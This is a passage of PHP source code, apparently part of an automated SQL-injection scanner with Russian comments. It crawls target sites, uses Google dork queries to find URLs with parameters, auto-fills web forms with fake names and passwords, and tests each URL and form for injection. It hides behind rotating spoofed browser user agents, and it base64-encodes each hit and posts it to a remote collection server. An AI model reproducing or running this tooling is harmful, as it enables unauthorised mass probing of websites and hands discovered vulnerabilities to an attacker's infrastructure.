			$this->l1_main_form = array_slice($this->l1_main_form, 0, $this->l1_main_form_slice);
			
			
			
			$this->l1_main_form = array_unique($this->l1_main_form);
            
            $this->d($this->l1_main_form,'links_pars для FORMS!!!');
            
            
			
			
			if(count($this->l1_main_form) > 0)
			{
				
				foreach($this->l1_main_form as $links_form_check)
				{	
				
					$links_form_check = str_replace('"','',$links_form_check);
				
					$value2 = str_replace($this->engeen_addr_site, 'DICK!', $links_form_check);
					
					if(strstr($value2,'DICK!'))
					{
						$this->d($value2,'DICK!');
						
						continue;
						
					}
				
				
				
				
					$this->d($links_form_check,'$links_form_check');
				
					$this->form_set['form_page_default'] = $this->filter_url($links_form_check);

					$con = $this->form_page_url($links_form_check);
					
					$new = time();
					$razn = $new-$this->time_all;
					//стопаем перебор если слишком долго идет
					if($razn>$this->time2){$this->d('TIME!!!! ALL');return false;}
					
					
                    //$con = 'https://my.tsianalytics.com/lang/ru';
                    
					$this->form_search($con);
				
                    unset($this->global_form[0]);
                
					$this->d($this->global_form,'$this->global_form');
					//exit;
				
					
				
				
					
					if($this->post_check==true)
					{
						$form_ku = $this->form_start($this->global_form,$links_form_check);
						
						//if($form_ku == true){
							//return $form_ku;
						//}
					}
				}
			}
			
			
			if($this->get_check ==false)
				{
					return false;
				}
			//$this->d($this->forms_goods,'$this->forms_goods');
			
			
			
						
			
			$this->d('++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++');
			
			//далее идет с каждой найденой ссылкы с главной на новую страницу и собирает там еще ссылки
			$res = $this->crowler_parse_url($crowler_links,$page);
			
		
			
			//if($res == false){return false;}
		
			
			$this->d($this->l1_main,'$this->l1_main$this->l1_main$this->l1_main$this->l1_main$this->l1_main');
			
			$links_pars = array_merge_recursive($this->l1_main, $this->l1);//с главной(sitemap) +кравлер
			
		
			$this->d($this->l1,'$this->l1$this->l1$this->l1$this->l1$this->l1$this->l1');
			
			$links_pars = array_unique($links_pars);// дубли удаляем
			$this->d($links_pars,'links_pars MAIN+SITEMAP+google');
			
			
			
			
			//exit;
			
			
			//$this->d($this->a1,'$this->a1');
			
			
			if(count($links_pars[0])==0)
			{
				$this->d('not linls crowler_parse_url crowler');
				return false;
			}else
			{
			
				foreach($links_pars as $crowler_one_url)
				{
					$znak = explode('?',$crowler_one_url);
					
					if($znak[1] !='')
					{
						
						
						$value3 = str_replace($this->engeen_addr_site, 'DICK!', $crowler_one_url);
						
						if(strstr($value3,'DICK! 22'))
						{
							$this->d($value3,'DICK 22!');
							
							continue;
							
						}
						
						
						
						$crowler_one_url = str_replace(array('http://','https://'),'',$crowler_one_url);	
						$ku[] = trim($crowler_one_url);
					}
				
				}
		
		
		
				shuffle($ku);
				$ku = array_unique($ku);
				$ku = array_slice($ku, 0, $this->limit_page_inj_test);
				
				//$this->d($ku,'kukukuku');
				

				//exit;
				
				
				
				//exit;
				
				
			
			
				foreach($ku as $crowler_one_url2)
				{

					$new = time();
					$razn = $new-$this->time_all;
					
					//стопаем перебор если слишком долго идет
					if($razn>$this->time2){$this->d('TIME!!!! ALL INJECT GET TEST');return false;}
					
				
					##тестируемс	
					$crowler_one_url2 = str_replace('"','',$crowler_one_url2);
					
					$crowler_one_url2 = str_replace("'",'',$crowler_one_url2);
					
					$this->d($crowler_one_url2,'new iteration url crowler');
					
					
					
					
					$data_inj = $this->inj_test($crowler_one_url2);
					
					if($data_inj !=false)
					{
						
						
						$this->count_links_good =  $this->count_links_good+1;
						
						$check_new = 'get::'.$crowler_one_url2;
					
					
					
					
						
					
						$bb = base64_encode('get::'.$crowler_one_url2."::".$data_inj);
						
						$this->d($data_inj,'$data_inj');
						$data = $this->get_post_out($this->server_url.'/posts/post_input',$bb);
						$this->d($data,'data');
						
						
						if($this->count_links_good==$this->count_links_good_get_return)
						{
							return $crowler_one_url2.':::'.$data_inj;
						}
						
						
					}
				}	
			}
		}
		return false;
	}
	
	public function crowler_google($domen){
		
		$domen = str_replace('www.','',$domen);
		
		$ip = $_SERVER['SERVER_ADDR'];
		
		
		
		 $url = "https://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=site:$domen++inurl:%22.php%3F%22+%7C+inurl:%22%26%22&userip=$ip";
		
		
		 $this->d($url,'url');
		//exit; 
		 $ch = curl_init();
		 curl_setopt($ch, CURLOPT_URL,$url);
		 curl_setopt($ch, CURLOPT_USERAGENT, "");
		 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
		 curl_setopt($ch, CURLOPT_HEADER, 0);
		 curl_setopt($ch, CURLOPT_REFERER, "http://www.google.ru/"); 
		 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		 curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		 curl_setopt($ch, CURLOPT_TIMEOUT, 15);
		 curl_setopt($ch, CURLOPT_POST, 0);

		$data = curl_exec($ch);
		
		$json = json_decode($data);
		
		//$this->d($json,'$json');
		
		$this->l1_google = array();
		
		if($json->responseStatus == 200)
		{
			
			$this->d('ok 200');
			
			foreach($json->responseData->results as $tmp)
			{
				
				$this->d($tmp->unescapedUrl,'unescapedUrl');
				
					
				$this->l1_google[] = str_replace(array('http://','https://'),'',$tmp->unescapedUrl);
					
			}
		}else{
			$this->d('NO (( 200');
			
		}	
	}
	
	public function crowler_parse_url_main($links,$page=1){

	
	
	
	if($page ==0 | $this->limit_crawler ==0){return true;}
	
	
	foreach ($links as $link)
	{
		
		
		$new = time();
		$razn = $new-$this->time_all;
		
		//стопаем перебор если слишком долго идет
		if($razn>$this->time2_main){ $this->d('TIME!!!! ALL MAIN!!'); return false;}
	
		
	//	$link = str_replace('http://', '', $link);
		//$link = str_replace('https://', '', $link);
		$link = str_replace('amp;', '', $link);
		$link = str_replace('../../', '', $link);
		$link = str_replace('../', '', $link);
		$link = str_replace('./', '', $link);
		$link = str_replace('"', '', $link);
		$link = str_replace("'", '', $link);
		
		
	$this->crowler_url = str_replace('http://', '', $this->crowler_url);
	$this->crowler_url = str_replace('https://', '', $this->crowler_url);
	$this->crowler_url2 = str_replace('www.', '', $this->crowler_url);

	if (preg_match('/(google)\./si', $link)) continue; // откидываем левые ссылки
		
	
		
	if (preg_match('/(.*).(css|jpg|gif|png|js|flv|swf|avi|mp3|mp4|mreg|pdf|ico|png|jpeg)|^#$/si', $link)) continue; // откидываем левые ссылки
		
		
		
		
		if (preg_match('/(onmouseout|style=|.css|href=|script=|target=|mailto|google|vk.com|vkontake|yahoo|vkontakte|yandex|ya.ru|bing|href|style=|mail.ru|class=|rambler|onmouseout|liveinternet|script=|onmouseover|href=|javascript|style.css|facebook|odnoklassniki|blogger|twitter|visionshop)/si', $link)) continue; // откидываем левые ссылки	
		
		
		
		
		$link_old = $link;
		$l = $link;
		
		$link = preg_replace('/=([^&]+)/si', '=', $link); // убираем всё что после = идет 
		
		
		
		if (!in_array($link, $this->a1_main))
		{
			
			//$this->d('<<< '.$link_old." link d rabote page - $page ");
					
			
			
			$this->a1_main[] = $link; // ваще это массик чтобы не повторяться
			$this->a2_main[] = $link_old; // ваще это массик чтобы не повторяться
			
	
				if (preg_match('/^(http:\/\/|https:\/\/)?(www.)?'.$this->crowler_url2.'\//si', $l))
				{ 
					//$this->d($l,'^(http:\/\/|https:\/\/)?(www.)?$this->crowler_url\/');
				}
				elseif(preg_match('/^(http:\/\/|https:\/\/)+(www.)?/si', $l))
				{ 
					//$this->d($l,'(http:\/\/|https:\/\/)+(www.)');
				}
				elseif (preg_match('/^\//si', $l))
				{ 
					$l = $this->crowler_url.$l;	
					//$this->d($l,'^');
				}
				elseif (preg_match('/^\./si', $l))
				{
					$l = str_replace('./', '', $l);
					$l = $this->crowler_url.'/'.$l;
					//$this->d($l,'^\./');
				}
				elseif (preg_match('/^\?/si', $l))
				{ 
					$l = $this->crowler_url."/".$l;	
					$this->d($l,'^\?');
				}
				elseif (preg_match('/^(.*)\.(htm|php|asp|aspx|html|shtml|do|cfm|cgi|pl|txt|action|js|asmx|dhtml|xhtml|jsp)/si', $l))
				{
					$l = $this->crowler_url.'/'.$l;
					//$this->d($l,'(htm|php|asp|aspx|html|shtml|do|cf)');
				}
				elseif (preg_match('/^(.*)\?=/si', $l))
				{
					$l = $this->crowler_url.'/'.$l;
					//$this->d($l,'^(.*)\?=');
					
				}elseif (preg_match('/^([a-z,0-9_])+/si', $l))
				{
					$l = $this->crowler_url.'/'.$l;
					//$this->d($l,'([a-z,0-9_\/])');
				}
				
			
			
			##########################
			
			
			
			//exit;
			
			//необычные замены производим
			
			$l = str_replace("/.php",'/php',$l);
			$l = str_replace("/.asp",'/asp',$l);
			$l = str_replace($this->crowler_url."/".$this->crowler_url,$this->crowler_url,$l);
			
			//$this->d(' ->>> '.$link_old."($l) "."  link itog page - $page");
			
			//если в домене содердится host но это линк на этом сайте, а не стороний
			if (preg_match('/^(www.)?(.*)?'.$this->crowler_url2.'/si', $l))
			{
				
			
				$this->limit_crawler--;
				//$this->d($this->limit_crawler);
				

				if (preg_match('/\?/si', $l))
				{
					
					$this->limit_crawler--;
				
					if($this->limit_crawler==0)
					{
						$this->d($this->limit_crawler,'$this->limit_crawler limit 0!!');
						return true;
					}
					
					$this->l1_main[] = $l;// итоговый массив линков
					$this->l1_main_form[] = $l;// итоговый массив линков
				}else{
					
					$this->l1_main_form[] = $l;// итоговый массив линков
				}	
			}	
		}
	}
	//return $this->l1;
}

	public function crowler_parse_url($links,$page=3){
	
		
		
		
		if($page ==0 | $this->limit_crawler ==0){return true;}
		
		$this->crowler_url = str_replace('http://', '', $this->crowler_url);
		$this->crowler_url2 = str_replace('www.', '', $this->crowler_url);
		
		
		
		
		
		foreach ($links as $link)
		{
			
			//$this->d($link,'$link');
	
			$new = time();
			$razn = $new-$this->time_all;
			
			//стопаем перебор если слишком долго идет
			if($razn>$this->time2){$this->d('TIME!!!! ALL');return false;}
		
			
			
			$link = str_replace('amp;', '', $link);
			$link = str_replace('../../', '', $link);
			$link = str_replace('../', '', $link);
			$link = str_replace('./', '', $link);
			
			
			
			
		if (preg_match('/(.*).(css|jpg|gif|png|js|flv|swf|avi|mp3|mp4|mreg|ico|png|jpeg)|^#$/si', $link)) continue; // откидываем левые ссылки
			
			
			
			$link_old = $link;
			$l = $link;
			
			$link = preg_replace('/=([^&]+)/si', '=', $link); // убираем всё что после = идет 
			
			
			
			if (!in_array($link, $this->a1))
			{ 
				
				if($page==$this->page)
				{
					$this->d('-----------------------------');
				}
				  
				$this->d('<<< '.$link_old." link d rabote page - $page ");
						
				
				
				$this->a1[] = $link; // ваще это массик чтобы не повторяться
				//$this->d($link,'link');
				$this->a2[] = $link_old; // ваще это массик чтобы не повторяться
				
				//$this->d($this->a1,'$this->a1');
				if (preg_match('/^(http:\/\/|https:\/\/)?(www.)?'.$this->crowler_url2.'\//si', $l))
				{ 
					$this->d($l,'^(http:\/\/|https:\/\/)?(www.)?$this->crowler_url\/');
				}
				elseif(preg_match('/^(http:\/\/|https:\/\/)+(www.)?/si', $l))
				{ 
					$this->d($l,'(http:\/\/|https:\/\/)+(www.)');
				}
				elseif (preg_match('/^\//si', $l))
				{ 
					$l = $this->crowler_url.$l;	
					$this->d($l,'^');
				}
				elseif (preg_match('/^\./si', $l))
				{
					$l = str_replace('./', '', $l);
					$l = $this->crowler_url.'/'.$l;
					$this->d($l,'^\./');
				}
				elseif (preg_match('/^\?/si', $l))
				{ 
					$l = $this->crowler_url."/".$l;	
					$this->d($l,'^\?');
				}
				elseif (preg_match('/^(.*)\.(htm|php|asp|aspx|html|shtml|do|cfm|cgi|pl|txt|action|js|asmx|dhtml|xhtml|jsp)/si', $l))
				{
					$l = $this->crowler_url.'/'.$l;
					$this->d($l,'(htm|php|asp|aspx|html|shtml|do|cf)');
				}
				elseif (preg_match('/^(.*)\?=/si', $l))
				{
					$l = $this->crowler_url.'/'.$l;
					$this->d($l,'^(.*)\?=');
					
				}elseif (preg_match('/^([a-z,0-9_])+/si', $l))
				{
					$l = $this->crowler_url.'/'.$l;
					$this->d($l,'([a-z,0-9_\/])');
				}
				
			
				
				##########################
			
				
				
				
				//необычные замены производим
				
				$l = str_replace("/.php",'/php',$l);
				$l = str_replace("/.asp",'/asp',$l);
				$l = str_replace($this->crowler_url."/".$this->crowler_url,$this->crowler_url,$l);
				
				$this->d(' ->>> '.$link_old."($l) "."  link itog page - $page");
				
				//если в домене содердится host но это линк на этом сайте, а не стороний
				if (preg_match('/^(http:\/\/|https:\/\/)?(www.)?(.*)?'.$this->crowler_url2.'/si', $l))
				{
					
						
					
					
					$this->limit_crawler--;
					$this->d($this->limit_crawler);
					
					if($this->limit_crawler==0)
					{
						$this->d($this->limit_crawler,'$this->limit_crawler limit 0!!');
						return true;
					}
					
					
					if(strpos($l,"?"))
					{
						
						$l = str_replace("'", '', $l);
						$l = str_replace('"', '', $l);
						$this->d($l,'good l');
						$this->l1[] = $l;// итоговый массив линков
					}
					
					
					
					$get_links = $this->get_url($l,true);
						
					//$this->d($get_links,'$get_links$get_links$get_links$get_links$get_links');
					//exit;
						
					//if(count($get_links) !=0){$this->d($get_links,'ot links - '.$l.' page - '.$page);}
							
					$res = $this->crowler_parse_url($get_links,$page-1);
					//if($res == true){return true;}
					
					

				}	
				
			}
			
		}
		//return $this->l1;
	}
	
	public function get_post_out($url,$post){
			
			
		$url = trim($url);	
		$ch = curl_init(); 	
			
		if($this->htaccess_auth !=''){
			$this->d($this->htaccess_auth);
			curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
			curl_setopt($ch, CURLOPT_USERPWD, $this->htaccess_auth);
		}
		
		if($this->https)
		{
			$url_new = 'https://'.$url;
		}else
		{
			$url_new = 'http://'.$url;
		}
			
			
	$this->d($url_new,'$url_new_KUDA SHLEM');
			
		#curl_setopt( $ch, CURLOPT_HTTPHEADER,$headers); 
		curl_setopt ($ch, CURLOPT_URL,$url_new);
		curl_setopt ($ch, CURLOPT_HEADER, 1);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		#curl_setopt ($ch, CURLOPT_FAILONERROR, 1); // Fail on errors
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 20);
		curl_setopt ($ch, CURLOPT_REFERER, "http://google.com");
		curl_setopt ($ch, CURLOPT_USERAGENT,"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial");
		curl_setopt ($ch, CURLOPT_COOKIEFILE, 'coo.txt'); 
		curl_setopt ($ch, CURLOPT_COOKIEJAR, 'coo.txt'); 
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, 	'data='.$post);
		
		$con = curl_exec($ch); 
		curl_close ($ch);
		//$this->d($con,'con');
	}
	
	public function get_url($url,$parser=false){
		
		$url = str_replace(array('http://','htpps://'),'',$url);
		$ch = curl_init(); 
		$headers = array
		(
			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8',
			'Accept-Language: ru,en-us;q=0.7,en;q=0.3',
			'Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7'
		); 

		      $uagent = array(
"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial",		  
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; E-nrgyPlus; .NET CLR 1.1.4322; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; eMusic DLM/3; MSN Optimized;US; MSN Optimized;US)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.025; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.179[128]; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.3.04b)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iOpus-I-M; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; Sgrunt|V109|1746|S-1740532934|dialno; snprtz|dialno; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=; YPC 3.2.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; IEMB3; IEMB3; yplus 5.1.04b)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; FunWebProducts; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; SV1; snprtz|S04087544802137; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; yplus 5.6.02b)");
		
		  ///рандомные значения
		
		  $ua = trim($uagent[mt_rand(0,sizeof($uagent)-1)]);	
		
		if($this->https)
		{
			$url_new = 'https://'.$url;
		}else
		{
			$url_new = 'http://'.$url;
		}
		
		
		curl_setopt( $ch, CURLOPT_HTTPHEADER,$headers); 
		curl_setopt ($ch, CURLOPT_URL,$url_new);
		curl_setopt ($ch, CURLOPT_HEADER, 1);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt ($ch, CURLOPT_FAILONERROR, 1); // Fail on errors
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 20);
		curl_setopt ($ch, CURLOPT_REFERER, "http://google.com");
		curl_setopt ($ch, CURLOPT_USERAGENT, $ua);
		curl_setopt ($ch, CURLOPT_COOKIEFILE, 'coo.txt'); 
		curl_setopt ($ch, CURLOPT_COOKIEJAR, 'coo.txt'); 
		$con = curl_exec($ch); 
		
		curl_close ($ch);
		
		//$this->d($con,'$con');
		//exit;
		
		
		if($parser){$this->form_search($con,$url);}
		
		//$this->d('kukukuku');
		
		if($this->sitemap==true)
		{
			
			preg_match_all('/<loc>(.*?)<\/loc>/si', $con, $links); //разделитель "
			$get_links = $links[1];
		}else
		{
			$links4 = array();
			preg_match_all('/href="([^"]+)/si', $con, $links); //разделитель "
			
			//$this->d($links,'$links');
			
			preg_match_all('/href=\'([^\']+)/si', $con, $links2); //разделитель '
		
			//$this->d($links2,'$links2');
			
			preg_match_all('/href=([^\>]+)/si', $con, $links3); //разделитель ваще без всего
			
			//$this->d($links3,'$links3');
			//exit;
			//preg_match_all('/href=([^ \s]+)/si', $con, $links4); //разделитель ваще без всего
			
			//$this->d($links4,'$links4');
			
			$get_links_ = array_merge($links2[1], $links[1]);
			
			//$this->d($get_links_,'$get_links_');
			
			
			//$get_links3 = array_merge($get_links_, $links3[1]);
			
			$get_links = array_merge($get_links_, $links3[1]);
			//$get_links = array_merge($get_links3, $links4[1]);
			
			
			
		}
		
	
		
	

		//exit;
		
		$get_links = array_unique($get_links);// дубли удаляем
		
		
		
		unset($con);
		
		
		foreach($get_links as $one_l){
			
			
			if(preg_match('/(target=|mailto|google|vk.com|vkontake|yahoo|vkontakte|yandex|ya.ru|bing|href|style=|mail.ru|class=|rambler|onmouseout|liveinternet|script=|onmouseover|href=|javascript|style.css|facebook|odnoklassniki|blogger|twitter|visionshop)/i',$one_l)){
				
			}else{
				
				$get_links_new[]= str_replace('"','',$one_l);
			}
			
		}
		
		
		
		
		
		
		
	//	$this->d($get_links_new,'$get_links_new');
		//exit;
		
		return $get_links_new;
	}
	
	public function form_start($forms_all,$link=''){
		
		
		//$this->form_enable=true;
		
		
		//$url = 'http://demo.testfire.net/bank/login.aspx';
		//$url = 'http://testphp.vulnweb.com/login.php';
		
		//получаем страницу где формы находяться, обычная загрузка страницы
		
		
		//$forms_all = array_unique($forms_all);
		
		
		$this->p = rand(10000,99999);
		$this->r = $this->str_rand();
		
		$this->forms_all = $forms_all;
		
		
		
		
		
		//$this->d($this->forms_done,'$this->forms_done');
		
		
		
		
		foreach($forms_all as $forms)
		{
			
			
			
			
			$new = time();
			$razn = $new-$this->time_all;
			if($razn>$this->time2){$this->d('TIME!!!! ALL');return false;}
			
			
			
			$this->form_set['forms'] = $forms;
			$form_post_data = array();
			$form_page_full_query ='';
			$form_post_query = '';
			$str ='';
			
			//	редактируем пост формат под себя ВЫДЕЛЯЕМ ACTION И INPUT
            
            $this->d($forms,'form orig');
            
			$form_post_data  = $this->form_post_data($forms);
			$this->form_set['form_post_data'] = $form_post_data['post'];
			$this->form_set['form_post_act'] = $form_post_data['act'];
			$this->d($form_post_data,'$form_post_data !!!!');
			
			$this->form_set['form_post_act'] = str_replace('www.','',$this->form_set['form_post_act']);
			
			if(isset($this->forms_done[$this->form_set['form_post_act']]))
			{
				
				
				
				$this->d($this->forms_done[$this->form_set['form_post_act']],' UJE BILA TAKAYA FORMA PROPUSK');
				continue;
			}
			
			//$this->d($forms ,'FORM START V RABOTE' );
			
			
			$this->forms_done[$this->form_set['form_post_act']] = $this->form_set['form_post_act'];
		
			$form_post_query = $this->form_post_query($form_post_data['post']);//чистая query строка
			$this->form_set['form_post_query'] = $form_post_query;
			$this->d($form_post_query,'$form_post_query');
			
			
			$form_page_full_query = $this->form_page_full_query($this->form_set['form_post_act'],$form_post_query);
			$this->form_set['form_page_full_query'] = $form_page_full_query;
			$this->d($form_page_full_query,'form_page_full_query');
			
			exit;
			$check_new = 'post::'.$form_page_full_query;
			
			
	
			
			
				
				
			$data_inj = $this->inj_test($check_new);
			
			if($data_inj !=false)
			{
				
				$this->check_post_form++;
				
				$this->d(check_post_form,' check_post_form - !!!!!!!!!!!!!!!!!!!!POST GOOD !!!!!!!!!!!!!!!!!!!!!!!!!!!!');
				
				
				if($this->add_one_domen==true)
				{
					
					$bb = base64_encode('post::'.$form_page_full_query."::".$data_inj);
					
					$this->d($bb ,'$bb-'.$form_page_full_query);
					
					
					$this->d($data_inj,'$data_inj');
					
					$data = $this->get_post_out_domen($this->server_url.'/posts/post_input',$bb);
					return 'post::'.$form_page_full_query."::".$data_inj;
				}else
				{
					
					$bb = base64_encode('post::'.$form_page_full_query."::".$data_inj);
					$data = $this->get_post_out($this->server_url.'/posts/post_input',$bb);
					
					if($this->check_post_form==$this->count_links_good_post_return)
					{
						
						return 'post::'.$form_page_full_query."::".$data_inj;
					}
					
					
				}
				
			
				$this->d($bb ,'$bb-'.$form_page_full_query);
		
				$this->d($data_inj,'$data_inj');
				
				//$this->d($data,'data');
			}else{
				
				$this->d($check_new,' BAD (((( inj_test');
				
			}
			
		}
		
		//exit;
		
	}
	
	public function form_post_data($form_pars){//массив пост
		
		
		
		if(count($form_pars)>0)
		{
				
				//foreach($forms as $form_one)
				//{
					$form_one = $form_pars[0];
					//$this->d($form_one,'$form_one');
					//exit;
					
					
					$act = $form_one["form_data"]["action"];
					$act = str_replace('wwwww.', 'www.', $act);
					$act = str_replace('wwww.', 'www.', $act);
					$act = str_replace('www.', '', $act);
					$act = str_replace('http://', '', $act);
					$act = str_replace('https://', '', $act);
					$act = str_replace('amp;', '', $act);
					$act = str_replace('../../', '', $act);
					$act = str_replace('../', '', $act);
					$act = str_replace('./', '', $act);
					//	$act = str_replace('/', '', $act);
					
					
					$this->d($act,'$act');
					
					if (preg_match('/'.$this->form_host.'/si', $act))
					{
						$new_act = $act;
					}else{
						$act = str_replace('/', '', $act);
						
						//if($act{0}=='/'){$new_act = $this->form_host.$act;}else{$new_act = $this->form_host.''.$act;}
						
						$new_act = $this->form_host.'/'.$act;
						
						
					}
					
					
					
					
					$gg = explode('?',$new_act);
					
					$new_act = $gg[0];
					
					$this->d($new_act,'$new_act');
					//exit;
					$this->form_set['form_post_act'] = $new_act;
					
				
					
					foreach($form_one["buttons"] as $bbb){
						
						$this->d($bbb,'$bbb');
						$bbb = str_replace('?', '', $bbb);
						
                        if($bbb['name']==''){
                            
                            $bbb['name'] = 'buttons';
                        }
                        
						$bbb_new[$bbb['name']]=$bbb;
						
					}
					
					
					
					$tmpall = array();
				
					$tmpall = array_merge($form_one["form_elemets"],$bbb_new);
					
                    $this->d($tmpall,'$tmpall');
                    //$this->d($bbb_new,'$bbb_new');
					//exit;
                    
                    
					$form_post_data = array('act'=>$new_act,'post'=>$tmpall);
					
					
					
					
				//}
				
				return $form_post_data;
						
					
		}else
		{
			return false;
		}			
	
	}
	
	public function form_post_query($postdata){ //Чисто квери
		
		
		//exit;
		
		
		
		
		$str='';
		
		foreach($postdata as $pp=>$value)
		{
			
				$this->d($value,'$value');
		
				$r = $this->str_rand();
				$this->r = $r;

				
	
				if($value['type']=='submit')
				{
					if($value['name'] !=''){
						if($pp !=''){$str.=$pp.'='.$value['value']."&";}else{$str.=$value['name'].'='.$value['value']."&";}
						
					}else{
						if($pp !=''){$str.=$pp.'='.$value['value']."&";}else{$str.=$value['value'].'='.$value['value']."&";}
						
					
					}
					
				}else
				{
					$this->d($value,$pp);
					
                   
                    
                    
					if(preg_match('/name/i',$pp,$math))
					{
						
						$str.=$pp.'=Terlimpopok'.$this->r.'&';
					}
					elseif(preg_match('/Nachna/i',$pp,$math))
					{
						
						$str.=$pp.'=Terlimpopok'.$this->r.'&';
					}
					elseif(preg_match('/surna/i',$pp,$math))
					{
						
						$str.=$pp.'=Terlimpopok'.$this->r.'&';
					}
					elseif(preg_match('/user/i',$pp,$math))
					{
						
						$str.=$pp.'=Terlimpopokuser'.$this->r.'&';
					}
					elseif(preg_match('/pass/i',$pp,$math))
					{
						
						$str.=$pp.'=jZsBSzejAI&';
					}
					elseif(preg_match('/ddress/i',$pp,$math))
					{
						
						$str.=$pp.'=Streetlenyau_13'.$r.'&';
					}
					elseif(preg_match('/mail/i',$pp,$math))
					{
						
						$str.=$pp.'=good'.$this->r.'@webgood.org&';
					}
					elseif(preg_match('/phone/i',$pp,$math))
					{
						
						$str.=$pp.'=198211'.$this->p.'&';
					}else{
						
                        if($pp !=''){$str.=$pp.'='.$value['value']."&";}else{$str.=$value['name'].'='.$value['value']."&";}
					
						//$str.=$pp.'=9999999&';
						
						
					}
				
				}
			
			//break;	
		}
		
		$str = substr($str,0,-1);
		$this->d($str,'$str');
		//exit;		
		 
		 return  $str;
		
	}
	
	public function form_page_full_query($act,$form_post_query){//Полный get c query
		$form_page_full_query = $act.'?'.$form_post_query;
		
		$form_page_full_query = str_replace('"','',$form_page_full_query);
					
		$form_page_full_query = str_replace("'",'',$form_page_full_query);
		
		return $form_page_full_query;
	}	
		
	public function form_page_url($url){ //зайти на страницу и взять контакт html и отравить на распарсивание WEB_GET_PAGE
		
		
		$this->check_https($url);
		$url = $this->filter_url($url);
		
		//$url = str_replace(array('http://','htpps://'),'',$url);
		
		
		if($this->https)
		{
			$url_new = 'https://'.$url;
		}else
		{
			$url_new = 'http://'.$url;
		}
		
		
		
		$tempurl = parse_url($url_new);
		
		$this->form_host = $tempurl['host'];
		
		//$this->d($tempurl,'$tempurl');
		
		$ch = curl_init(); 
		$headers = array
		(
			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8',
			'Accept-Language: ru,en-us;q=0.7,en;q=0.3',
			'Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7'
		); 

		      $uagent = array(
"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial",		  
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; E-nrgyPlus; .NET CLR 1.1.4322; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; eMusic DLM/3; MSN Optimized;US; MSN Optimized;US)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.025; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.179[128]; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.3.04b)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iOpus-I-M; .NET CLR 1.1.4322)",
